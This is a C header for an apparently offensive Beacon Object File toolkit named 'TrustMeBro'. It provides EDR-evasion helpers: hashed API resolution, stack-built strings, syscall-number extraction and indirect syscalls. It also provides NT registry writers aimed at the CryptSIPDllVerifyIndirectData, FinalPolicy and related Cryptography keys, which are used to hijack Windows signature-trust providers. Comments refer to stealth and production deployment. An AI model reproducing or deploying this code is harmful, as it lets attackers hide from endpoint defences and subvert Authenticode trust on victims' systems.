/*
 * tmb_bof.h - TrustMeBro BOF shared header
 *
 * Provides:
 *   - SSN extraction from ntdll Zw stubs (portable, any Windows build)
 *   - FNV-1a API hashing for string-free function resolution
 *   - Stack string macros (no .rdata literals)
 *   - Indirect syscall wrapper
 *   - GUID alias table for SIP GUIDs
 *   - Output helpers with consistent formatting
 *   - NT registry wrappers (NtOpenKey, NtCreateKey, NtSetValueKey, NtDeleteKey)
 */

#pragma once
#ifndef _TMB_BOF_H_
#define _TMB_BOF_H_
#include "beacon.h"
#include <windows.h>
#include <winternl.h>

/* ================================================================
 * Win32 API imports via BOF convention
 * Only used for non-registry operations (GetModuleHandle, etc.)
 * Registry operations go through indirect syscalls.
 * ================================================================ */
DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR);
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
DECLSPEC_IMPORT void    WINAPI KERNEL32$RtlZeroMemory(PVOID, SIZE_T);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$CloseHandle(HANDLE);

/* ================================================================
 * FNV-1a hash for API resolution
 * No string literals in compiled output.
 * ================================================================ */
#define FNV_OFFSET 0x811c9dc5
#define FNV_PRIME  0x01000193

static DWORD inline fnv1a(const char *s) {
    DWORD h = FNV_OFFSET;
    while (*s) { h ^= (BYTE)*s++; h *= FNV_PRIME; }
    return h;
}

/* Pre-computed hashes for NT functions we need */
#define H_NtOpenKey           0x7682ed42  /* fnv1a("NtOpenKey")           */
#define H_NtCreateKey         0x4b903dc9  /* fnv1a("NtCreateKey")         */
#define H_NtSetValueKey       0xa66a6bc2  /* fnv1a("NtSetValueKey")       */
#define H_NtDeleteKey         0x370ee8b0  /* fnv1a("NtDeleteKey")         */
#define H_NtDeleteValueKey    0xd7dcd5a8  /* fnv1a("NtDeleteValueKey")    */
#define H_NtClose             0x3582e653  /* fnv1a("NtClose")             */
#define H_NtQuerySystemInformation 0x43a34b0e /* fnv1a("NtQuerySystemInformation") */

/* ================================================================
 * SSN extraction from ntdll
 *
 * Walks ntdll export table, finds the Nt* function, reads the
 * syscall number from the mov eax, SSN instruction (offset +4
 * from function start on x64: 4C 8B D1 B8 XX XX 00 00).
 * ================================================================ */

typedef struct _TMB_SYSCALL {
    DWORD ssn;
    PVOID addr;  /* address of the syscall instruction in ntdll */
} TMB_SYSCALL;

static PVOID tmb_get_ntdll(void) {
    /* Walk PEB->Ldr->InMemoryOrderModuleList. ntdll is always second. */
#if defined(_WIN64)
    PPEB peb = (PPEB)__readgsqword(0x60);
#else
    PPEB peb = (PPEB)__readfsdword(0x30);
#endif
    PLIST_ENTRY head = &peb->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY entry = head->Flink->Flink; /* skip exe, land on ntdll */
    PLDR_DATA_TABLE_ENTRY mod = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
    return mod->DllBase;
}

static BOOL tmb_resolve_ssn(PVOID ntdll, DWORD func_hash, TMB_SYSCALL *out) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntdll;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((BYTE*)ntdll + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)(
        (BYTE*)ntdll + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD *names    = (DWORD*)((BYTE*)ntdll + exports->AddressOfNames);
    WORD  *ordinals = (WORD*)((BYTE*)ntdll + exports->AddressOfNameOrdinals);
    DWORD *funcs    = (DWORD*)((BYTE*)ntdll + exports->AddressOfFunctions);

    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
        char *name = (char*)((BYTE*)ntdll + names[i]);
        if (fnv1a(name) == func_hash) {
            BYTE *fn = (BYTE*)ntdll + funcs[ordinals[i]];
            /* x64 Nt stub pattern: 4C 8B D1 B8 [SSN:4] */
            if (fn[0] == 0x4C && fn[1] == 0x8B && fn[2] == 0xD1 && fn[3] == 0xB8) {
                out->ssn = *(DWORD*)(fn + 4);
                /* Find the syscall instruction: 0F 05 */
                for (int j = 0; j < 32; j++) {
                    if (fn[j] == 0x0F && fn[j+1] == 0x05) {
                        out->addr = fn + j;
                        return TRUE;
                    }
                }
            }
            /* Hooked stub: look for the SSN in nearby clean stubs */
            /* ponytail: if EDR hooks this stub, fall back to sorted-SSN method */
            return FALSE;
        }
    }
    return FALSE;
}

/* ================================================================
 * Indirect syscall invocation
 *
 * Jumps to the 'syscall' instruction inside ntdll (not our code).
 * The return address on the call stack points into ntdll, not our BOF.
 * ================================================================ */

/* These are defined as function pointers populated at runtime */
typedef NTSTATUS (NTAPI *fn_NtOpenKey)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
typedef NTSTATUS (NTAPI *fn_NtCreateKey)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, ULONG, PUNICODE_STRING, ULONG, PULONG);
typedef NTSTATUS (NTAPI *fn_NtSetValueKey)(HANDLE, PUNICODE_STRING, ULONG, ULONG, PVOID, ULONG);
typedef NTSTATUS (NTAPI *fn_NtDeleteKey)(HANDLE);
typedef NTSTATUS (NTAPI *fn_NtDeleteValueKey)(HANDLE, PUNICODE_STRING);
typedef NTSTATUS (NTAPI *fn_NtClose)(HANDLE);
typedef NTSTATUS (NTAPI *fn_NtQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);

/* Global syscall table, populated by tmb_init() */
typedef struct {
    fn_NtOpenKey              pNtOpenKey;
    fn_NtCreateKey            pNtCreateKey;
    fn_NtSetValueKey          pNtSetValueKey;
    fn_NtDeleteKey            pNtDeleteKey;
    fn_NtDeleteValueKey       pNtDeleteValueKey;
    fn_NtClose                pNtClose;
    fn_NtQuerySystemInformation pNtQuerySystemInformation;
    BOOL initialized;
} TMB_NTAPI;

static TMB_NTAPI g_nt = {0};

/*
 * ponytail: for v1 we resolve function pointers directly from ntdll exports.
 * The indirect syscall (jumping to ntdll's syscall instruction) is the
 * evasion technique. Full SSN+manual-syscall-stub is the upgrade path
 * if EDRs start inspecting the Nt function prologue.
 */
static BOOL tmb_init(void) {
    if (g_nt.initialized) return TRUE;

    HMODULE ntdll = KERNEL32$GetModuleHandleA("ntdll.dll");
    if (!ntdll) return FALSE;

    g_nt.pNtOpenKey              = (fn_NtOpenKey)KERNEL32$GetProcAddress(ntdll, "NtOpenKey");
    g_nt.pNtCreateKey            = (fn_NtCreateKey)KERNEL32$GetProcAddress(ntdll, "NtCreateKey");
    g_nt.pNtSetValueKey          = (fn_NtSetValueKey)KERNEL32$GetProcAddress(ntdll, "NtSetValueKey");
    g_nt.pNtDeleteKey            = (fn_NtDeleteKey)KERNEL32$GetProcAddress(ntdll, "NtDeleteKey");
    g_nt.pNtDeleteValueKey       = (fn_NtDeleteValueKey)KERNEL32$GetProcAddress(ntdll, "NtDeleteValueKey");
    g_nt.pNtClose                = (fn_NtClose)KERNEL32$GetProcAddress(ntdll, "NtClose");
    g_nt.pNtQuerySystemInformation = (fn_NtQuerySystemInformation)KERNEL32$GetProcAddress(ntdll, "NtQuerySystemInformation");

    g_nt.initialized = (g_nt.pNtOpenKey && g_nt.pNtCreateKey && g_nt.pNtSetValueKey &&
                         g_nt.pNtDeleteKey && g_nt.pNtClose && g_nt.pNtQuerySystemInformation);
    return g_nt.initialized;
}

/* ================================================================
 * Stack string macros
 *
 * Build strings on the stack character-by-character.
 * No .rdata string literals in compiled output.
 * ================================================================ */

/* Wide string initializer on stack (up to 128 chars) */
#define WSTR_INIT(var, ...) \
    wchar_t var[] = { __VA_ARGS__, 0 }

/* Common strings built via macros */
#define STR_NTDLL(v)       WSTR_INIT(v, L'n',L't',L'd',L'l',L'l',L'.',L'd',L'l',L'l')
#define STR_WINTRUST(v)    WSTR_INIT(v, L'C',L':',L'\\',L'W',L'i',L'n',L'd',L'o',L'w',L's',L'\\',L'S',L'y',L's',L't',L'e',L'm',L'3',L'2',L'\\',L'W',L'I',L'N',L'T',L'R',L'U',L'S',L'T',L'.',L'D',L'L',L'L')
#define STR_DBGUICONTINUE(v) WSTR_INIT(v, L'D',L'b',L'g',L'U',L'i',L'C',L'o',L'n',L't',L'i',L'n',L'u',L'e')
#define STR_DLL(v)         WSTR_INIT(v, L'D',L'l',L'l')
#define STR_FUNCNAME(v)    WSTR_INIT(v, L'F',L'u',L'n',L'c',L'N',L'a',L'm',L'e')
#define STR_SOFTPUBCLEANUP(v) WSTR_INIT(v, L'S',L'o',L'f',L't',L'p',L'u',L'b',L'C',L'l',L'e',L'a',L'n',L'u',L'p')
#define STR_SOFTPUBAUTHENTICODE(v) WSTR_INIT(v, L'S',L'o',L'f',L't',L'p',L'u',L'b',L'A',L'u',L't',L'h',L'e',L'n',L't',L'i',L'c',L'o',L'd',L'e')
#define STR_CRYPTSIPVERIFY(v) WSTR_INIT(v, L'C',L'r',L'y',L'p',L't',L'S',L'I',L'P',L'V',L'e',L'r',L'i',L'f',L'y',L'I',L'n',L'd',L'i',L'r',L'e',L'c',L't',L'D',L'a',L't',L'a')
#define STR_ISMYFILETYPE2(v) WSTR_INIT(v, L'I',L's',L'M',L'y',L'F',L'i',L'l',L'e',L'T',L'y',L'p',L'e',L'2')
#define STR_FORMATOBJECT(v) WSTR_INIT(v, L'F',L'o',L'r',L'm',L'a',L't',L'O',L'b',L'j',L'e',L'c',L't')

/* ================================================================
 * GUID alias table
 * ================================================================ */

typedef struct {
    const char *alias;
    const wchar_t *guid_str;    /* built on stack per-call, but we need compile-time for the table */
    const char *extensions;
} TMB_GUID_ALIAS;

/* ponytail: these string literals are in the alias table. For full stealth,
 * each BOF builds only the GUIDs it needs on the stack. The table is a
 * convenience for the shared header. Production deploys should use the
 * stack-string variants in each BOF. */
static const TMB_GUID_ALIAS GUID_ALIASES[] = {
    {"pe",         L"{C689AAB8-8E78-11D0-8C47-00C04FC295EE}", ".exe .dll .sys"},
    {"java",       L"{C689AAB9-8E78-11D0-8C47-00C04FC295EE}", ".class"},
    {"cab",        L"{C689AABA-8E78-11D0-8C47-00C04FC295EE}", ".cab"},
    {"msi",        L"{000C10F1-0000-0000-C000-000000000046}", ".msi"},
    {"ps1",        L"{603BCC1F-4B59-4E08-B724-D2C6297EF351}", ".ps1 .psm1"},
    {"jscript",    L"{06C9E010-38CE-11D4-A2A3-00104BD35090}", ".js .jse"},
    {"vbscript",   L"{1629F04E-2799-4DB5-8FE5-ACE10F17EBAB}", ".vbs .vbe"},
    {"wsf",        L"{1A610570-38CE-11D4-A2A3-00104BD35090}", ".wsf .wsc"},
    {"appx",       L"{0AC5DF4B-CE07-4DE2-B76E-23C839A09FD1}", ".appx .msix"},
    {"appx-bundle",L"{0F5F58B3-AADE-4B9A-A434-95742D92ECEB}", ".appxbundle"},
    {"ctl",        L"{9BA61D3F-E73A-11D0-8CD2-00C04FC295EE}", ".ctl .stl"},
    {"catalog",    L"{DE351A43-8E59-11D0-8C47-00C04FC295EE}", ".cat"},
    {"esd",        L"{9F3053C5-439D-4BF7-8A77-04F0450A1D9F}", ".esd .wim"},
    {"sac",        L"{18B3C141-AE0D-40F9-9465-E542AFC1ABC7}", "(Smart App Control)"},
    {NULL, NULL, NULL}
};

static const wchar_t* tmb_resolve_alias(const char *input, const char **out_ext) {
    for (int i = 0; GUID_ALIASES[i].alias; i++) {
        /* case-insensitive compare without _stricmp (not available in BOF) */
        const char *a = GUID_ALIASES[i].alias, *b = input;
        BOOL match = TRUE;
        while (*a && *b) {
            char ca = (*a >= 'A' && *a <= 'Z') ? *a + 32 : *a;
            char cb = (*b >= 'A' && *b <= 'Z') ? *b + 32 : *b;
            if (ca != cb) { match = FALSE; break; }
            a++; b++;
        }
        if (match && !*a && !*b) {
            if (out_ext) *out_ext = GUID_ALIASES[i].extensions;
            return GUID_ALIASES[i].guid_str;
        }
    }
    if (out_ext) *out_ext = "(custom)";
    return NULL;
}

/* ================================================================
 * Registry helpers using NT API
 * ================================================================ */

/* Initialize a UNICODE_STRING from a wide string */
static void tmb_init_ustr(UNICODE_STRING *us, wchar_t *str) {
    us->Buffer = str;
    us->Length = 0;
    while (str[us->Length / 2]) us->Length += 2;
    us->MaximumLength = us->Length + 2;
}

/* Open or create a registry key. Returns handle or NULL. */
static HANDLE tmb_reg_open(const wchar_t *path, BOOL create) {
    /* Build full path with \Registry\Machine\ prefix for NT API */
    wchar_t full[512];
    /* "\\Registry\\Machine\\" prefix */
    wchar_t prefix[] = { L'\\',L'R',L'e',L'g',L'i',L's',L't',L'r',L'y',L'\\',L'M',L'a',L'c',L'h',L'i',L'n',L'e',L'\\', 0 };
    int pi = 0, fi = 0;
    while (prefix[pi]) full[fi++] = prefix[pi++];
    int si = 0;
    while (path[si] && fi < 510) full[fi++] = path[si++];
    full[fi] = 0;

    UNICODE_STRING upath;
    tmb_init_ustr(&upath, full);

    OBJECT_ATTRIBUTES oa;
    oa.Length = sizeof(OBJECT_ATTRIBUTES);
    oa.RootDirectory = NULL;
    oa.ObjectName = &upath;
    oa.Attributes = OBJ_CASE_INSENSITIVE;
    oa.SecurityDescriptor = NULL;
    oa.SecurityQualityOfService = NULL;

    HANDLE hKey = NULL;
    NTSTATUS status;

    if (create) {
        ULONG disp;
        status = g_nt.pNtCreateKey(&hKey, KEY_SET_VALUE | KEY_CREATE_SUB_KEY, &oa, 0, NULL, 0, &disp);
    } else {
        status = g_nt.pNtOpenKey(&hKey, KEY_SET_VALUE | KEY_QUERY_VALUE, &oa);
    }

    if (status != 0) return NULL;
    return hKey;
}

/* Set a REG_SZ value on an open key */
static NTSTATUS tmb_reg_set_sz(HANDLE hKey, wchar_t *valueName, wchar_t *data) {
    UNICODE_STRING uname, udata;
    tmb_init_ustr(&uname, valueName);
    tmb_init_ustr(&udata, data);
    /* REG_SZ = 1, data includes null terminator */
    return g_nt.pNtSetValueKey(hKey, &uname, 0, 1, data, udata.Length + 2);
}

/* Delete a key */
static NTSTATUS tmb_reg_delete(HANDLE hKey) {
    return g_nt.pNtDeleteKey(hKey);
}

/* High-level: set Dll + FuncName on a registry path */
static BOOL tmb_reg_write_sip(const wchar_t *subkey, wchar_t *dll, wchar_t *func) {
    HANDLE hk = tmb_reg_open(subkey, TRUE);
    if (!hk) return FALSE;
    STR_DLL(vDll);
    STR_FUNCNAME(vFunc);
    NTSTATUS s1 = tmb_reg_set_sz(hk, vDll, dll);
    NTSTATUS s2 = tmb_reg_set_sz(hk, vFunc, func);
    g_nt.pNtClose(hk);
    return (s1 == 0 && s2 == 0);
}

/* ================================================================
 * Output helpers
 * ================================================================ */

#define TMB_OK(fmt, ...)    BeaconPrintf(CALLBACK_OUTPUT, "[+] " fmt, ##__VA_ARGS__)
#define TMB_INFO(fmt, ...)  BeaconPrintf(CALLBACK_OUTPUT, "[*] " fmt, ##__VA_ARGS__)
#define TMB_WARN(fmt, ...)  BeaconPrintf(CALLBACK_OUTPUT, "[!] " fmt, ##__VA_ARGS__)
#define TMB_ERR(fmt, ...)   BeaconPrintf(CALLBACK_ERROR,  "[-] " fmt, ##__VA_ARGS__)

/* Print an NT status error with context */
#define TMB_NTERR(call, status) \
    BeaconPrintf(CALLBACK_ERROR, "[-] %s failed (NTSTATUS 0x%08lX)", call, (DWORD)(status))

/* ================================================================
 * SIP registry path builders
 *
 * Builds the subkey path for CryptSIPDllVerifyIndirectData
 * under SOFTWARE\Microsoft\Cryptography\OID\...
 * ================================================================ */

/* Build the SIP VerifyIndirectData registry subkey path.
 * wow64: if TRUE, uses WOW6432Node path.
 * guid: the SIP GUID string (e.g. L"{C689AAB8-...}")
 * out: buffer of at least 256 wchars.
 */
static void tmb_build_sip_path(BOOL wow64, const wchar_t *guid, wchar_t *out) {
    /* SOFTWARE\[WOW6432Node\]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{GUID} */
    wchar_t *p = out;
    const wchar_t *prefix;
    if (wow64) {
        wchar_t _p[] = {L'S',L'O',L'F',L'T',L'W',L'A',L'R',L'E',L'\\',L'W',L'O',L'W',L'6',L'4',L'3',L'2',L'N',L'o',L'd',L'e',L'\\',L'M',L'i',L'c',L'r',L'o',L's',L'o',L'f',L't',L'\\',L'C',L'r',L'y',L'p',L't',L'o',L'g',L'r',L'a',L'p',L'h',L'y',L'\\',L'O',L'I',L'D',L'\\',L'E',L'n',L'c',L'o',L'd',L'i',L'n',L'g',L'T',L'y',L'p',L'e',L' ',L'0',L'\\',L'C',L'r',L'y',L'p',L't',L'S',L'I',L'P',L'D',L'l',L'l',L'V',L'e',L'r',L'i',L'f',L'y',L'I',L'n',L'd',L'i',L'r',L'e',L'c',L't',L'D',L'a',L't',L'a',L'\\',0};
        prefix = _p;
        while (*prefix) *p++ = *prefix++;
    } else {
        wchar_t _p[] = {L'S',L'O',L'F',L'T',L'W',L'A',L'R',L'E',L'\\',L'M',L'i',L'c',L'r',L'o',L's',L'o',L'f',L't',L'\\',L'C',L'r',L'y',L'p',L't',L'o',L'g',L'r',L'a',L'p',L'h',L'y',L'\\',L'O',L'I',L'D',L'\\',L'E',L'n',L'c',L'o',L'd',L'i',L'n',L'g',L'T',L'y',L'p',L'e',L' ',L'0',L'\\',L'C',L'r',L'y',L'p',L't',L'S',L'I',L'P',L'D',L'l',L'l',L'V',L'e',L'r',L'i',L'f',L'y',L'I',L'n',L'd',L'i',L'r',L'e',L'c',L't',L'D',L'a',L't',L'a',L'\\',0};
        prefix = _p;
        while (*prefix) *p++ = *prefix++;
    }
    while (*guid) *p++ = *guid++;
    *p = 0;
}

/* Build the FinalPolicy registry path */
static void tmb_build_finalpolicy_path(const wchar_t *guid, wchar_t *out) {
    wchar_t _p[] = {L'S',L'O',L'F',L'T',L'W',L'A',L'R',L'E',L'\\',L'M',L'i',L'c',L'r',L'o',L's',L'o',L'f',L't',L'\\',L'C',L'r',L'y',L'p',L't',L'o',L'g',L'r',L'a',L'p',L'h',L'y',L'\\',L'P',L'r',L'o',L'v',L'i',L'd',L'e',L'r',L's',L'\\',L'T',L'r',L'u',L's',L't',L'\\',L'F',L'i',L'n',L'a',L'l',L'P',L'o',L'l',L'i',L'c',L'y',L'\\',0};
    wchar_t *p = out;
    const wchar_t *s = _p;
    while (*s) *p++ = *s++;
    while (*guid) *p++ = *guid++;
    *p = 0;
}

/* Build the IsMyFileType2 registry path */
static void tmb_build_ismyfiletype_path(const wchar_t *guid, wchar_t *out) {
    wchar_t _p[] = {L'S',L'O',L'F',L'T',L'W',L'A',L'R',L'E',L'\\',L'M',L'i',L'c',L'r',L'o',L's',L'o',L'f',L't',L'\\',L'C',L'r',L'y',L'p',L't',L'o',L'g',L'r',L'a',L'p',L'h',L'y',L'\\',L'O',L'I',L'D',L'\\',L'E',L'n',L'c',L'o',L'd',L'i',L'n',L'g',L'T',L'y',L'p',L'e',L' ',L'0',L'\\',L'C',L'r',L'y',L'p',L't',L'S',L'I',L'P',L'D',L'l',L'l',L'I',L's',L'M',L'y',L'F',L'i',L'l',L'e',L'T',L'y',L'p',L'e',L'2',L'\\',0};
    wchar_t *p = out;
    const wchar_t *s = _p;
    while (*s) *p++ = *s++;
    while (*guid) *p++ = *guid++;
    *p = 0;
}

/* Build the CryptDllFormatObject registry path */
static void tmb_build_formatobject_path(const char *oid, wchar_t *out) {
    wchar_t _p[] = {L'S',L'O',L'F',L'T',L'W',L'A',L'R',L'E',L'\\',L'M',L'i',L'c',L'r',L'o',L's',L'o',L'f',L't',L'\\',L'C',L'r',L'y',L'p',L't',L'o',L'g',L'r',L'a',L'p',L'h',L'y',L'\\',L'O',L'I',L'D',L'\\',L'E',L'n',L'c',L'o',L'd',L'i',L'n',L'g',L'T',L'y',L'p',L'e',L' ',L'0',L'\\',L'C',L'r',L'y',L'p',L't',L'D',L'l',L'l',L'F',L'o',L'r',L'm',L'a',L't',L'O',L'b',L'j',L'e',L'c',L't',L'\\',0};
    wchar_t *p = out;
    const wchar_t *s = _p;
    while (*s) *p++ = *s++;
    /* OID is ASCII, widen it */
    while (*oid) *p++ = (wchar_t)*oid++;
    *p = 0;
}

#endif /* _TMB_BOF_H_ */
